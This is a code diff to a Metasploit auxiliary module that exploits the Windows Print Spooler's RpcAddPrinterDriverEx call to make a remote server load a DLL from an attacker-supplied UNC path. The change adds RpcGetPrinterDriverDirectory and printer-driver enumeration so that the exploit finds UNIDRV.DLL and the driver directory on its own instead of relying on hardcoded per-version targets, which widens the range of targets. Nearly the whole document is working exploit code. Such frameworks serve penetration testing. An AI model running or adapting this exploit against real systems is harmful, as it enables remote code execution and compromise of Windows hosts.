@@ -14,6 +14,7 @@ module PrintSystem
 
   # Operation numbers
   RPC_ENUM_PRINTER_DRIVERS = 10
+  RPC_GET_PRINTER_DRIVER_DIRECTORY = 12
   RPC_ADD_PRINTER_DRIVER_EX = 89
 
   # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b
@@ -110,11 +111,11 @@ module PrintSystem
     uint32 :error_status
   end
 
-  # for RpcEnumPrinterDrivers' `BYTE* pDriver` field
+  # for RpcEnumPrinterDrivers and RpcGetPrinterDriverDirectory `BYTE*` fields
   class NdrLpLpByte < RubySMB::Dcerpc::Ndr::NdrPointer
     endian :little
 
-    ndr_lp_byte :referent, onlyif: -> { self.referent_id != 0 }
+    ndr_lp_byte :referent, onlyif: -> { referent_id != 0 }
   end
 
   # [3.1.4.4.2 RpcEnumPrinterDrivers (Opnum 10)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/857d00ac-3682-4a0d-86ca-3d3c372e5e4a)
@@ -169,6 +170,58 @@ module PrintSystem
       (4 - offset) % 4
     end
   end
+
+  # [3.1.4.4.4 RpcGetPrinterDriverDirectory (Opnum 12)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/9df11cf4-4098-4852-ad72-d1f75a82bffe)
+  class RpcGetPrinterDriverDirectoryRequest < BinData::Record
+    attr_reader :opnum
+
+    endian :little
+
+    def initialize_instance
+      super
+      @opnum = RPC_GET_PRINTER_DRIVER_DIRECTORY
+    end
+
+    ndr_lp_str          :p_name
+    string              :pad1, length: -> { pad_length(p_name) }
+    ndr_lp_str          :p_environment
+    string              :pad2, length: -> { pad_length(p_environment) }
+    uint32              :level
+    ndr_lp_lp_byte      :p_driver_directory
+    string              :pad3, length: -> { pad_length(p_driver_directory) }
+    uint32              :cb_buf
+
+    # Determines the correct length for the padding, so that the next
+    # field is 4-byte aligned.
+    def pad_length(prev_element)
+      offset = (prev_element.abs_offset + prev_element.to_binary_s.length) % 4
+      (4 - offset) % 4
+    end
+  end
+
+  # [3.1.4.4.4 RpcGetPrinterDriverDirectory (Opnum 12)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/9df11cf4-4098-4852-ad72-d1f75a82bffe)
+  class RpcGetPrinterDriverDirectoryResponse < BinData::Record
+    attr_reader :opnum
+
+    endian :little
+
+    def initialize_instance
+      super
+      @opnum = RPC_GET_PRINTER_DRIVER_DIRECTORY
+    end
+
+    ndr_lp_lp_byte    :p_driver_directory
+    string            :pad1, length: -> { pad_length(p_driver_directory) }
+    uint32            :pcb_needed
+    uint32            :error_status
+
+    # Determines the correct length for the padding, so that the next
+    # field is 4-byte aligned.
+    def pad_length(prev_element)
+      offset = (prev_element.abs_offset + prev_element.to_binary_s.length) % 4
+      (4 - offset) % 4
+    end
+  end
 end
 
 class MetasploitModule < Msf::Auxiliary
@@ -176,17 +229,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::DCERPC
   include Msf::Exploit::Remote::SMB::Client::Authenticated
 
-  CheckCode = Exploit::CheckCode
   # PrintSystem = RubySMB::Dcerpc::PrintSystem
-
-  Target = Struct.new(:version, :arch, :driver_path)
-
-  TARGETS = [ # need to be in descending order by version number
-    Target.new('10.0.19041', ARCH_X64, 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_c62e9f8067f98247\\Amd64\\UNIDRV.DLL'),
-    Target.new('10.0.18362', ARCH_X64, 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_ce3301b66255a0fb\\Amd64\\UNIDRV.DLL'),
-    Target.new('10.0.17763', ARCH_X64, 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL'),
-    Target.new('10.0.14393', ARCH_X64, 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_dcef07064d319714\\Amd64\\UNIDRV.DLL'),
-  ].freeze
 
   def initialize(info = {})
     super(
@@ -234,12 +277,6 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('UNC_PATH', [ true, 'The UNC path the the DLL that the server should load' ]),
       ]
     )
-
-    register_advanced_options(
-      [
-        OptString.new('UnidrvPath', [ false, 'The path on the remote system to UNIDRV.DLL' ])
-      ]
-    )
   end
 
   def run
@@ -267,16 +304,6 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::NoTarget, 'Only x86 and x64 targets are supported')
     end
 
-    target_os_version = Rex::Version.new(simple.client.os_version)
-    fail_with(Failure::NotVulnerable, 'The target is not vulnerable.') if target_os_version > Rex::Version.new('10.0.19043')
-
-    driver_path = datastore['UnidrvPath']
-    if driver_path.blank?
-      target = TARGETS.find { |t| t.arch == arch && Rex::Version.new(t.version) <= target_os_version }
-      fail_with(Failure::NoTarget, 'No fingerprint matched the target. Set the UnidrvPath if it is known.') if target.nil?
-      driver_path = target.driver_path
-    end
-
     handle = dcerpc_handle(PrintSystem::UUID, '1.0', 'ncacn_np', ['\\spoolss'])
     vprint_status("Binding to #{handle} ...")
     begin
@@ -286,9 +313,16 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, "The DCERPC bind failed with error #{nt_status.name} (#{nt_status.description})")
     end
     vprint_status("Bound to #{handle} ...")
-    vprint_status('Obtaining a service manager handle...')
 
-    filename = datastore['UNC_PATH'].split('\\').last
+    print_status('Enumerating the installed printer drivers...')
+    drivers = enum_printer_drivers(environment)
+    driver_path = "#{drivers.driver_path.rpartition('\\').first}\\UNIDRV.DLL"
+    vprint_status("Using driver path: #{driver_path}")
+
+    config_directory = get_printer_driver_directory(environment)
+    vprint_status("Using directory: #{config_directory}")
+
+    filename = datastore['UNC_PATH'].rpartition('\\').last
     container = PrintSystem::DriverContainer.new(
       level: 2,
       tag: 2,
@@ -312,9 +346,21 @@ class MetasploitModule < Msf::Auxiliary
     add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, flags)
 
     1.upto(3) do |directory|
-      container.driver_info.p_config_file.assign("C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\#{directory}\\#{filename}")
+      container.driver_info.p_config_file.assign("#{config_directory}\\3\\old\\#{directory}\\#{filename}")
       add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, flags)
     end
+  end
+
+  def enum_printer_drivers(environment)
+    response = rprn_call('RpcEnumPrinterDrivers', p_environment: environment, level: 2)
+    response = rprn_call('RpcEnumPrinterDrivers', p_environment: environment, level: 2, p_drivers: [0] * response.pcb_needed, cb_buf: response.pcb_needed)
+    DriverInfo2.read(response.p_drivers.referent.value.map(&:chr).join)
+  end
+
+  def get_printer_driver_directory(environment)
+    response = rprn_call('RpcGetPrinterDriverDirectory', p_environment: environment, level: 2)
+    response = rprn_call('RpcGetPrinterDriverDirectory', p_environment: environment, level: 2, p_driver_directory: [0] * response.pcb_needed, cb_buf: response.pcb_needed)
+    RubySMB::Field::Stringz16.read(response.p_driver_directory.referent.value.map(&:chr).join).encode('ASCII-8BIT')
   end
 
   def add_printer_driver_ex(name, container, flags)
@@ -354,5 +400,32 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     PrintSystem.const_get("#{name}Response").read(raw_response)
+  end
+
+  class DriverInfo2Header < BinData::Record
+    endian :little
+
+    uint32     :c_version
+    uint32     :name_offset
+    uint32     :environment_offset
+    uint32     :driver_path_offset
+    uint32     :data_file_offset
+    uint32     :config_file_offset
+  end
+
+  # this is a partial implementation that just parses the data, this is *not* the same struct as PrintSystem::DriverInfo2
+  # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/2825d22e-c5a5-47cd-a216-3e903fd6e030
+  DriverInfo2 = Struct.new(:header, :name, :environment, :driver_path, :data_file, :config_file) do
+    def self.read(data)
+      header = DriverInfo2Header.read(data)
+      new(
+        header,
+        RubySMB::Field::Stringz16.read(data[header.name_offset..-1]).encode('ASCII-8BIT'),
+        RubySMB::Field::Stringz16.read(data[header.environment_offset..-1]).encode('ASCII-8BIT'),
+        RubySMB::Field::Stringz16.read(data[header.driver_path_offset..-1]).encode('ASCII-8BIT'),
+        RubySMB::Field::Stringz16.read(data[header.data_file_offset..-1]).encode('ASCII-8BIT'),
+        RubySMB::Field::Stringz16.read(data[header.config_file_offset..-1]).encode('ASCII-8BIT')
+      )
+    end
   end
 end
